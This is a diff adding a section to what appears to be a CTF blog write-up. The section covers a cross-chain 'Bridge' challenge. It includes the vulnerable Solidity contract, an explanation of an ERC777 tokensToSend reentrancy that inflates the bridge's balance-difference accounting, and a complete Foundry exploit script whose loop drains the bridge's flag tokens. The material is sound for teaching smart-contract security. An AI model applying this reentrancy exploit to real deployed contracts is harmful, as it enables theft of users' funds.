@@ -2836,6 +2836,562 @@ contract StablecoinSolve is Script {
 ```
 {%end%}
 
+# Bridge
+
+P: "You've stumbled upon a cross-chain bridge contract, enabling ETH and ERC20 token transfers between chains. The Bridge contract has 100 ether of flag token. You are given 1 ether of flag token. Your goal is to drain Bridge contract below 90 ether."
+
+{% note(clickable=true, header="Bridge.sol") %}
+
+```solidity
+//SPDX-License-Identifier:MIT
+pragma solidity ^0.8.20;
+
+import {Address} from "@openzeppelin-contracts-4.8.0/contracts/utils/Address.sol";
+import {IERC20, IERC20Metadata} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/extensions/IERC20Metadata.sol";
+import {ERC20} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/ERC20.sol";
+import {ERC777} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC777/ERC777.sol";
+
+contract Bridge {
+    uint256 public immutable CHAIN_ID;
+    address public immutable FLAG_TOKEN;
+    address public relayer;
+    mapping(uint256 => address) public remoteBridge;
+    mapping(address => uint256) public remoteBridgeChainId;
+    mapping(uint256 => mapping(address => bool)) public isTokenRegisteredAtRemote;
+
+    uint256 internal msgNonce;
+    mapping(bytes32 => bool) public relayedMessages;
+    uint256 public relayedMessageSenderChainId;
+    address public relayedMessageSenderAddress;
+    mapping(address => address) public remoteTokenToLocalToken;
+    mapping(address => bool) public isBridgedERC20;
+
+    event SendRemoteMessage(
+        uint256 indexed targetChainId,
+        address indexed targetAddress,
+        address indexed sourceAddress,
+        uint256 msgValue,
+        uint256 msgNonce,
+        bytes msgData
+    );
+    event RelayedMessage(bytes32 indexed msgHash);
+
+    event ETH_transfer(address indexed to, uint256 amount);
+    event ERC20_register(address indexed token, string name, string symbol);
+    event ERC20_transfer(address indexed token, address indexed to, uint256 amount);
+
+    constructor(address _relayer, address flagToken, uint256 chainId) {
+        relayer = _relayer;
+        FLAG_TOKEN = flagToken;
+        CHAIN_ID = chainId;
+    }
+
+    modifier onlyRelayer() {
+        require(msg.sender == relayer, "R");
+        _;
+    }
+
+    modifier onlyRemoteBridge() {
+        uint256 senderChainId = Bridge(payable(msg.sender)).relayedMessageSenderChainId();
+        require(
+            msg.sender == remoteBridge[senderChainId] && senderChainId != 0
+                && remoteBridgeChainId[msg.sender] == senderChainId,
+            "RB"
+        );
+        _;
+    }
+
+    function isSolved() external view returns (bool) {
+        return IERC20(FLAG_TOKEN).balanceOf(address(this)) < 90 ether;
+    }
+
+    function registerRemoteBridge(uint256 _remoteChainId, address _remoteBridge) external onlyRelayer {
+        remoteBridge[_remoteChainId] = _remoteBridge;
+        remoteBridgeChainId[_remoteBridge] = _remoteChainId;
+    }
+
+    receive() external payable virtual {
+        require(msg.sender == tx.origin, "Only EOA");
+        ethOut(msg.sender);
+    }
+
+    function ethOut(address _to) public payable virtual {
+        emit ETH_transfer(_to, msg.value);
+        uint256 _remoteChainId = CHAIN_ID == 1 ? 2 : 1;
+        address _remoteBridge = remoteBridge[_remoteChainId];
+        this.sendRemoteMessage{value: msg.value}(
+            _remoteChainId, _remoteBridge, abi.encodeWithSelector(Bridge.ethIn.selector, _to)
+        );
+    }
+
+    function ethIn(address _to) external payable onlyRemoteBridge {
+        emit ETH_transfer(_to, msg.value);
+        Address.sendValue(payable(_to), msg.value);
+    }
+
+    function ERC20Out(address _token, address _to, uint256 _amount) external {
+        emit ERC20_transfer(_token, _to, _amount);
+
+        uint256 _remoteChainId = CHAIN_ID == 1 ? 2 : 1;
+        address _remoteBridge = remoteBridge[_remoteChainId];
+
+        if (isBridgedERC20[_token]) {
+            BridgedERC20(_token).burn(msg.sender, _amount);
+            _token = BridgedERC20(_token).REMOTE_TOKEN();
+        } else {
+            uint256 balance = IERC20(_token).balanceOf(address(this));
+            require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), "T");
+            _amount = IERC20(_token).balanceOf(address(this)) - balance;
+            if (!isTokenRegisteredAtRemote[_remoteChainId][_token]) {
+                this.sendRemoteMessage(
+                    _remoteChainId,
+                    _remoteBridge,
+                    abi.encodeWithSelector(
+                        Bridge.ERC20Register.selector,
+                        _token,
+                        IERC20Metadata(_token).name(),
+                        IERC20Metadata(_token).symbol()
+                    )
+                );
+                isTokenRegisteredAtRemote[_remoteChainId][_token] = true;
+            }
+        }
+
+        this.sendRemoteMessage(
+            _remoteChainId, _remoteBridge, abi.encodeWithSelector(Bridge.ERC20In.selector, _token, _to, _amount)
+        );
+    }
+
+    function ERC20Register(address _remoteToken, string memory _name, string memory _symbol)
+        external
+        onlyRemoteBridge
+    {
+        emit ERC20_register(_remoteToken, _name, _symbol);
+
+        if (remoteTokenToLocalToken[_remoteToken] == address(0)) {
+            address _token = address(new BridgedERC20(msg.sender, _remoteToken, _name, _symbol));
+            remoteTokenToLocalToken[_remoteToken] = _token;
+            isBridgedERC20[_token] = true;
+        }
+    }
+
+    function ERC20In(address _token, address _to, uint256 _amount) external payable onlyRemoteBridge {
+        emit ERC20_transfer(_token, _to, _amount);
+
+        if (remoteTokenToLocalToken[_token] != address(0)) {
+            BridgedERC20(remoteTokenToLocalToken[_token]).mint(_to, _amount);
+        } else {
+            require(IERC20(_token).transfer(_to, _amount), "T");
+        }
+    }
+
+    function sendRemoteMessage(uint256 _targetChainId, address _targetAddress, bytes calldata _message)
+        public
+        payable
+    {
+        require(msg.sender == address(this), "S");
+        require(_targetChainId != CHAIN_ID, "C");
+        require(_targetAddress != address(0), "A");
+        emit SendRemoteMessage(_targetChainId, _targetAddress, msg.sender, msg.value, msgNonce, _message);
+        
+        uint256 _sourceChainId = CHAIN_ID;
+        address _sourceAddress = address(this);
+
+        bytes32 h = keccak256(
+            abi.encodeWithSignature(
+                "relayMessage(address,uint256,address,uint256,uint256,bytes)",
+                _targetAddress,
+                _sourceChainId,
+                _sourceAddress,
+                msg.value,
+                msgNonce,
+                _message
+            )
+        );
+        require(relayedMessages[h] == false, "H");
+        relayedMessages[h] = true;
+        emit RelayedMessage(h);
+        relayedMessageSenderChainId = _sourceChainId;
+        relayedMessageSenderAddress = _sourceAddress;
+        (bool success, bytes memory result) = _targetAddress.call{value: msg.value}(_message);
+        require(success, string(result));
+        relayedMessageSenderChainId = 0;
+        relayedMessageSenderAddress = address(0);
+
+        unchecked {
+            ++msgNonce;
+        }
+    }
+}
+
+contract Token is ERC777 {
+    constructor(address user, address[] memory a) ERC777("Token", "Tok", a) {
+        _mint(msg.sender, 100 ether, "", "", false);
+        _mint(user, 1 ether, "", "", false);
+    }
+}
+
+contract BridgedERC20 is ERC20 {
+    Bridge public immutable BRIDGE;
+    Bridge public immutable REMOTE_BRIDGE;
+    address public immutable REMOTE_TOKEN;
+
+    modifier onlyBridge() {
+        require(msg.sender == address(BRIDGE), "B");
+        _;
+    }
+
+    modifier onlyRemoteBridge() {
+        require(msg.sender == address(BRIDGE), "RB1");
+        require(
+            REMOTE_BRIDGE.relayedMessageSenderChainId() != 0
+                && BRIDGE.remoteBridgeChainId(REMOTE_BRIDGE.relayedMessageSenderAddress()) == REMOTE_BRIDGE.relayedMessageSenderChainId(),
+            "RB2"
+        );
+        _;
+    }
+    constructor(address _remoteBridge, address _remoteToken, string memory _name, string memory _symbol) ERC20(_name, _symbol) {
+        BRIDGE = Bridge(payable(msg.sender));
+        REMOTE_BRIDGE = Bridge(payable(_remoteBridge));
+        REMOTE_TOKEN = _remoteToken;
+    }
+
+    function mint(address _to, uint256 _amount) external onlyRemoteBridge {
+        _mint(_to, _amount);
+    }
+
+    function burn(address _from, uint256 _amount) external onlyBridge {
+        _burn(_from, _amount);
+    }
+}
+```
+{%end%}
+
+## Solution
+
+Yes man, bridges.. More interesting and I personally I love bridges. Let's do this as quick as possible. 
+
+Lets, break down the Bridge protocol. 
+
+1. **Bridge (Main Contract)**
+   - Handles cross-chain messaging and token transfers
+   - Manages remote bridge registrations and token registrations
+   - Key functions:
+     - `ethOut/ethIn`: Handles ETH transfers between chains
+     - `ERC20Out/ERC20In`: Handles ERC20 token transfers
+     - `ERC20Register`: Registers new tokens on remote chains
+     - `sendRemoteMessage`: Core function for sending messages between chains
+
+2. **BridgedERC20**
+   - Special ERC20 token for cross-chain transfers
+   - Can only be minted by remote bridge and burned by local bridge
+   - Tracks the remote token address and bridge contracts
+   - Implements strict access controls for minting/burning
+
+3. **Token**
+   - Simple ERC777 token used in the challenge
+   - Mints initial tokens to deployer and user
+
+This is not a complete bridge protocol because there is no off-chain componets like relayers, etc. But all the things were replicated in the smart contract itself. 
+Because of this it's confusing to understand which one is source contract and which one is destination contract. 
+
+Just follow me, `remoteBridge` means destination bridge, `ethOut()` or `ERC20Out()` means that the source contract is sending to destination contract. 
+`ethIn()` or `ERC20In()` are the functions which usually called by off-chain components like relayer but here the source contract directly calls these functions on destination contract. Here `ethIn()` or `ERC20In()` are restricted to be only calleable by the remote bridge. 
+`ERC20Register()` is to deploy a equivalent token (wrapped) on the destination for a token on source chain. Here, If the token was not registered the on the first bridging of that token the registration and the deployment of wrapped token will be done automatically. 
+The wrapped token which is going to be deployed for a token on source chain is `BridgedERC20` token. Token we are going to bridge is `Token` an `ERC777`. 
+
+
+Usually asset moving bridges will follow following modes of bridging. 
+- **Lock** asset on source chain then **Mint** a wrapped asset on destination
+- **Burn** and **Mint**
+- **Lock** and **Release**
+- **Burn** and **Mint**
+
+Here in this protocol the **Lock** and **Mint** in forward direction and when the same Wrapped token bridged back to source then the **Burn** and **Release** happens. (I'd love to explain all these in a dedicated blog post)
+
+`sendRemoteMessage()` function will log a message to be picked up by the off-chain relayer and send it to destination. But here all this relayer functionality was implemented in this function itself.
+It was restricted to be calling from by anyone else except the same contract functions with the following check. If this check was not there
+we could've simply call this to perform an attack. But no luck, we can't do this. 
+
+```solidity
+require(msg.sender == address(this), "S");
+```
+
+But the `sendRemoteMessage()` function is called by the `ethOut()` or `ERC20Out()` and then the call goes to `ethIn()` or `ERC20In()`. 
+
+```
+USER -> ethOut()/ERC20Out()  -> sendRemoteMessage() -> ethIn()/ERC20In() -> USER (mint/release tokens)
+```
+
+Let's get the initial state of the protocol, 
+
+```bash
+Bridge:  0xB4a8227E3312F40Ad03fbe7f747da61266EDC0Ba
+FLAG_TOKEN:  0x7a072D0a5C338679Da17C4922C364c03167D1fB2 (ERC777)
+Player balance of FLAG :  1000000000000000000
+SOURCE Bridge balance of FLAG :  100000000000000000000
+SOURCE CHAIN_ID :  1
+Total Default operators of FLAG :  0
+REMOTE CHAIN_ID :  2
+REMOTE Bridge:  0xd73fFbbd87624b59e166717676F0e10135C9fe3B
+REMOTE Bridge balance:  0
+```
+
+Expected initial data..
+
+How can we bridge the `1e18` of ERC777 Token that we got? By calling `ERC20Out()`
+
+```solidity
+function ERC20Out(address _token, address _to, uint256 _amount) external {
+        emit ERC20_transfer(_token, _to, _amount);
+        uint256 _remoteChainId = CHAIN_ID == 1 ? 2 : 1;
+        address _remoteBridge = remoteBridge[_remoteChainId];
+        if (isBridgedERC20[_token]) {
+            BridgedERC20(_token).burn(msg.sender, _amount);
+            _token = BridgedERC20(_token).REMOTE_TOKEN();
+        } else {
+            uint256 balance = IERC20(_token).balanceOf(address(this));
+            require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), "T");
+            _amount = IERC20(_token).balanceOf(address(this)) - balance;
+            if (!isTokenRegisteredAtRemote[_remoteChainId][_token]) {
+                this.sendRemoteMessage(
+                    _remoteChainId,
+                    _remoteBridge,
+                    abi.encodeWithSelector(
+                        Bridge.ERC20Register.selector,
+                        _token,
+                        IERC20Metadata(_token).name(),
+                        IERC20Metadata(_token).symbol()
+                    )
+                );
+                isTokenRegisteredAtRemote[_remoteChainId][_token] = true;
+            }
+        }
+        this.sendRemoteMessage(
+            _remoteChainId, _remoteBridge, abi.encodeWithSelector(Bridge.ERC20In.selector, _token, _to, _amount)
+        );
+    }
+```
+
+Observing the above function, if the token that we are sending is `BridgedERC20` then the burn happens. If not the lock happens. Nothing exciting in the if block. 
+But in the else block the lock of our token happens (ERC777). 
+
+Can you see the problem of these three lines???
+
+```solidity
+uint256 balance = IERC20(_token).balanceOf(address(this));
+require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), "T");
+_amount = IERC20(_token).balanceOf(address(this)) - balance;
+```
+
+I can see it.. The `balance` is fetched on line 1 then same balance is used after the `trnasferFrom()` call. What is anybody can **reenter** from that transferFrom call?? With standard ERC20 token transfers it's not possible.
+But it is possible from the `ERC777` transfers bacause of an extra feature called Hooks and Callbacks. 
+
+_"Hooks in ERC777 tokens serve as entry points for custom code execution during token transfers. They allow external smart contracts to intervene in the token transfer process, either before or after the transfer occurs. This flexibility is a double-edged sword, as it can be used for legitimate purposes but also exploited for malicious actions."_ - Johny
+
+### ERC777
+
+The following are the functions of ERC777 standard. In the `transferFrom()` the contract will call the 
+`_send()` hook, there in the hook if the sender is registered a `IERC777Sender` interface implementer in the `_ERC1820_REGISTRY` contract then the hook will call the `tokensToSend()` function on the implementor. Here the user is the sender but the implementor is someother contract registered by the user as his `IERC777Sender` implementor. Look at the following control flow for better understanding. 
+
+```
+User -> Deploys a contract -> Declares the contract as willing to be an implementer 
+User -> transferFrom() -> _send() -> _callTokensToSend() -> user Implementor.tokensToSend()
+```
+
+Okay, enough reconnaissance. Now we know the it is possible to reenter to back to the `ERC20Out()` function with callback hooks of `ERC777` via the `ERC-1820 registry`,
+
+```solidity
+    function transferFrom(
+        address holder,
+        address recipient,
+        uint256 amount
+    ) public virtual override returns (bool) {
+        address spender = _msgSender();
+        _spendAllowance(holder, spender, amount);
+        _send(holder, recipient, amount, "", "", false);
+        return true;
+    }
+
+        function _send(
+        address from,
+        address to,
+        uint256 amount,
+        bytes memory userData,
+        bytes memory operatorData,
+        bool requireReceptionAck
+    ) internal virtual {
+        require(from != address(0), "ERC777: transfer from the zero address");
+        require(to != address(0), "ERC777: transfer to the zero address");
+
+        address operator = _msgSender();
+
+        _callTokensToSend(operator, from, to, amount, userData, operatorData);
+
+        _move(operator, from, to, amount, userData, operatorData);
+
+        _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);
+    }
+
+    function _callTokensToSend(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes memory userData,
+        bytes memory operatorData
+    ) private {
+        address implementer = _ERC1820_REGISTRY.getInterfaceImplementer(from, _TOKENS_SENDER_INTERFACE_HASH);
+        if (implementer != address(0)) {
+            IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData);
+        }
+    }
+```
+
+### Attack 
+
+- Deploy an Attacker contract and register this attacker contract as the Implementer for the Player.
+- Send `0.5 ether` amount of ERC777 tokens to Attack
+- Inside `tokensToSend(operator, from, to, amount, userData, operatorData)` function of Attack contract, add the following logic 
+    - reenter to the `ERC20Out()` function by sending same `amount` again. 
+- Start the attack by calling `ERC20Out()` function with amount `0.5 ether`. 
+- The following vulnerable lines of code will execute
+
+    ```solidity
+        uint256 balance = IERC20(_token).balanceOf(address(this));  // 100 ether
+        require(IERC20(_token).transferFrom(msg.sender, address(this), _amount), "T"); // Call to Attack.tokensToSend()
+        _amount = IERC20(_token).balanceOf(address(this)) - balance;
+    ```
+
+- Attack contract wil reenter the function with amount `0.5 ether`, but the bridge balance is still 100 ether. 
+- Second `tranferFrom` call from Attack will be succeeded and Attack contract will get `0.5 ether` of `BridgedERC20` tokens. Bridge also gets `0.5 ether` of ERC777 tokens.
+- First `transferFrom` call completes will get `0.5 ether` of `BridgedERC20` tokens. Bridge also gets `0.5 ether` of ERC777 tokens. Bridge balance is now `101 ether`
+- Now on the third line ` _amount = IERC20(_token).balanceOf(address(this)) - balance;` 
+    - `_amount = 101 ether - 100 ether = 1 ether`
+- Now the  `1 ether` of `BridgedERC20` will be minted to Player. 
+- If we bridge these tokens back, `BridgedERC20` will be burned and `ERC777`(FLAG) tokens will be sent to Player.
+- After one successfull iteration of these steps we got `0.5 ether` of more tokens than we have. 
+
+Now do you own math and find a way to execute this logic until you got atleast `10 ether` of ERC777 tokens or FLAG tokens. 
+
+Don't look at my following exploit, I did a terrible math there. 
+
+
+{% note(clickable=true, header="Bridge.s.sol") %}
+```solidity
+// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+pragma solidity ^0.8.20;
+import {Script} from "forge-std/Script.sol";
+import {console} from "forge-std/console.sol";
+import {Bridge, Token, BridgedERC20} from "../src/Bridge.sol";
+import {IERC20, IERC20Metadata} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/extensions/IERC20Metadata.sol";
+import {IERC777Sender} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC777/IERC777Sender.sol";
+import {IERC1820Registry} from "@openzeppelin-contracts-4.8.0/contracts/utils/introspection/IERC1820Registry.sol";
+
+import {ERC1820Implementer} from "@openzeppelin-contracts-4.8.0/contracts/utils/introspection/ERC1820Implementer.sol";
+contract BridgeSolve is Script {
+    Bridge public bridge = Bridge(payable(0xB4a8227E3312F40Ad03fbe7f747da61266EDC0Ba));
+    Bridge public remoteBridge;
+    Token public flagToken;
+    
+    address public relayer;
+    address public player;
+    uint256 public CHAIN_ID = 1;
+    uint256 public REMOTE_CHAIN_ID = 2;
+    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
+
+    function run() public {
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        player = vm.envAddress("PLAYER");
+        console.log("Player : ", player);
+        console.log("Player balance: ", player.balance);
+        console.log("Bridge: ", address(bridge));
+        // console.log("Bridge balance: ", address(bridge).balance);
+        flagToken = Token(bridge.FLAG_TOKEN());
+        // relayer = bridge.relayer();
+        console.log("FLAG_TOKEN: ", address(flagToken));
+        console.log("Player balance of FLAG : ", flagToken.balanceOf(player));
+        console.log("SOURCE Bridge balance of FLAG : ", flagToken.balanceOf(address(bridge)));
+        console.log("SOURCE CHAIN_ID : ", CHAIN_ID);
+        // console.log("isSolved(): ", bridge.isSolved());
+        console.log("Total Default operators of FLAG : ", flagToken.defaultOperators().length); // NO operators
+        // console.log("Relayer: ", relayer);
+        remoteBridge = Bridge(payable(bridge.remoteBridge(REMOTE_CHAIN_ID)));
+        console.log("REMOTE CHAIN_ID : ", REMOTE_CHAIN_ID);
+        console.log("REMOTE Bridge: ", address(remoteBridge));
+        console.log("REMOTE Bridge balance: ", address(remoteBridge).balance);
+        Attack attack = new Attack(address(bridge), /*address(bridgedToken)*/ address(flagToken), player);
+        console.log("Attack : ", address(attack));
+       _ERC1820_REGISTRY.setInterfaceImplementer(player, _TOKENS_SENDER_INTERFACE_HASH, address(attack));
+        require(attack.isRegister()==address(attack), "Failed to set interface");
+        flagToken.approve(address(bridge), type(uint256).max);
+        address bridgedToken;
+        while (flagToken.balanceOf(address(bridge)) > 89 ether) {
+        // for (uint8 i; i <=1; i++){
+            uint256 amount = flagToken.balanceOf(address(player))/2;
+            flagToken.transfer(address(attack), amount);
+            bridge.ERC20Out(address(flagToken), player, amount);
+            bridgedToken = remoteBridge.remoteTokenToLocalToken(address(flagToken));
+            attack.sendMeback();
+            remoteBridge.ERC20Out(bridgedToken, player, BridgedERC20(bridgedToken).balanceOf(player));
+        }
+        bridgedToken = remoteBridge.remoteTokenToLocalToken(address(flagToken));
+        console.log("REMOTE Bridge balance of FLAG : ", flagToken.balanceOf(address(remoteBridge)));
+        // console.log("IS FLAG token registed at remote : ", bridge.isTokenRegisteredAtRemote(REMOTE_CHAIN_ID, address(flagToken)));
+        // console.log("FLAG token to local token(BridgedERC20) : ", bridgedToken);
+        console.log("Player balance of BridgedERC20 : ", BridgedERC20(bridgedToken).balanceOf(player));
+        // console.log("Attack balance of BridgedERC20 : ", BridgedERC20(bridgedToken).balanceOf(address(attack)));
+        console.log("Player balance of FLAG : ", flagToken.balanceOf(player));
+        console.log("SOURCE Bridge balance of FLAG : ", flagToken.balanceOf(address(bridge)));
+        console.log("Attack balance of FLAG : ", flagToken.balanceOf(address(attack)));
+        console.log("isSolved(): ", bridge.isSolved());
+        vm.stopBroadcast();
+    }
+}
+
+contract Attack is ERC1820Implementer, IERC777Sender {
+    // BridgedERC20 public bridgedERC20;
+    Bridge public bridge;
+    address public flagToken;
+    address public player;
+    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
+    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+
+    constructor(address _bridge, /*address _bridgedERC20,*/ address _flagToken, address _player) {
+        bridge = Bridge(payable(_bridge));
+        // bridgedERC20 = BridgedERC20(_bridgedERC20);
+        flagToken = _flagToken;
+        player = _player;
+        _registerInterfaceForAddress(_TOKENS_SENDER_INTERFACE_HASH, player);
+        IERC20(flagToken).approve(address(bridge), type(uint256).max);
+    }
+    function isRegister() public returns (address implementer){
+        implementer = _ERC1820_REGISTRY.getInterfaceImplementer(player, _TOKENS_SENDER_INTERFACE_HASH);
+    }
+    function sendMeback() external {
+        IERC20(flagToken).transfer(player, IERC20(flagToken).balanceOf(address(this)));
+    }
+    function tokensToSend(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external {
+        if ((from == player && to == address(this)) || (from == address(bridge) && to == player)){
+            return;
+        }
+        bridge.ERC20Out(address(flagToken), player, amount);
+    }
+}
+```
+{%end%}
+
+# Exchange
+
+
 
 ## References 
 1. [Anti Proxy Patterns](https://blog.trailofbits.com/2018/09/05/contract-upgrade-anti-patterns/)
